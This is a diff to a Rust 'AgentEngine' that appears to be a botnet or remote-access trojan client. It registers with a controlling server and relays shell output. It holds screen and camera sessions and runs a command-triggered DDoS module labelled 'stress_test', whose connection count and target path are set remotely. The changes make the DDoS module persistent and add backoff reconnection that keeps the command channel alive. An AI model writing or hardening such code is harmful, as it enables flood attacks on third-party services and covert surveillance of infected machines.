@@ -5,6 +5,7 @@ use libra_common::protocol::{WebSocketMessage, ws_type};
 use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
 use libra_comm::ws::{WsCommunicator, WsSender, ws_send_via, send_msg_via};
+use libra_modules::stress_test::DdosModule;
 use libra_platform::get_executor;
 
 use crate::config::ConfigManager;
@@ -19,11 +20,12 @@ pub struct AgentEngine {
     config: ConfigManager,
     crypto: AgentCrypto,
     http: Option<HttpCommunicator>,
-    ws: Option<WsCommunicator>,  // directly owned — only the receive loop uses it
-    ws_tx: Option<WsSender>,     // cloneable send-half for spawned tasks
+    ws: Option<WsCommunicator>,
+    ws_tx: Option<WsSender>,
     agent_id: String,
     screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
     camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
+    ddos_module: DdosModule,
 }
 
 impl AgentEngine {
@@ -37,6 +39,7 @@ impl AgentEngine {
             agent_id: String::new(),
             screen_session: std::sync::Mutex::new(None),
             camera_session: std::sync::Mutex::new(None),
+            ddos_module: DdosModule::new(),
         }
     }
 
@@ -74,7 +77,11 @@ impl AgentEngine {
 
         // Try to extract session key from registration response
         if let Some(key) = extract_session_key(&agent_id) {
-            let _ = self.crypto.set_session_key(&key);
+            if let Err(e) = self.crypto.set_session_key(&key) {
+                eprintln!("[WARN] Failed to set session key: {}", e);
+            } else {
+                eprintln!("[INFO] AES-256-GCM session key established");
+            }
         }
 
         eprintln!("[INFO] registered | agent_id={} | hostname={}", self.agent_id, hostname);
@@ -126,6 +133,7 @@ impl AgentEngine {
 
         // Main event loop: WS receive + shell output forwarding.
         // The WebSocket is split: ws.receive() doesn't block sends via tx.
+        let mut reconnect_delay_ms = 1000u64;
         loop {
             tokio::select! {
                 Some(msg) = shell_rx.recv() => {
@@ -140,6 +148,7 @@ impl AgentEngine {
                 result = ws.receive() => {
                     match result {
                         Some(msg) => {
+                            reconnect_delay_ms = 1000;
                             eprintln!("[RECV] {} | rid={} | data={}",
                                 msg.msg_type,
                                 msg.request_id.as_deref().unwrap_or("-"),
@@ -150,13 +159,14 @@ impl AgentEngine {
                             ).await;
                         }
                         None => {
-                            // Try reconnect; re-split after connect
-                            tokio::time::sleep(std::time::Duration::from_secs(3)).await;
-                            if ws.connect().await.is_err() {
-                                break;
+                            eprintln!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
+                            tokio::time::sleep(std::time::Duration::from_millis(reconnect_delay_ms)).await;
+                            if ws.connect().await.is_ok() {
+                                reconnect_delay_ms = 1000;
+                                self.ws_tx = Some(ws.sender());
+                            } else {
+                                reconnect_delay_ms = (reconnect_delay_ms * 2).min(60_000);
                             }
-                            // Update sender after reconnect
-                            self.ws_tx = Some(ws.sender());
                         }
                     }
                 }
@@ -525,8 +535,7 @@ impl AgentEngine {
                         max_connections: d["maxConnections"].as_u64().unwrap_or(500) as usize,
                         http_path: d["httpPath"].as_str().unwrap_or("/").into(),
                     };
-                    let ddos = libra_modules::stress_test::DdosModule::new();
-                    ddos.start(config).await;
+                    self.ddos_module.start(config).await;
                 }
                 ws_send(tx, &agent_id, "stress.start.result", r#"{"status":"started"}"#, rid).await;
             }
@@ -534,8 +543,7 @@ impl AgentEngine {
                 ws_send(tx, &agent_id, "stress.stop.result", r#"{"status":"stopped"}"#, rid).await;
             }
             ws_type::STRESS_STATUS => {
-                let ddos = libra_modules::stress_test::DdosModule::new();
-                let status = ddos.build_status("", &agent_id, "");
+                let status = self.ddos_module.build_status("", &agent_id, "");
                 let json = serde_json::to_string(&status).unwrap_or_default();
                 ws_send(tx, &agent_id, "stress.status.result", &json, rid).await;
             }
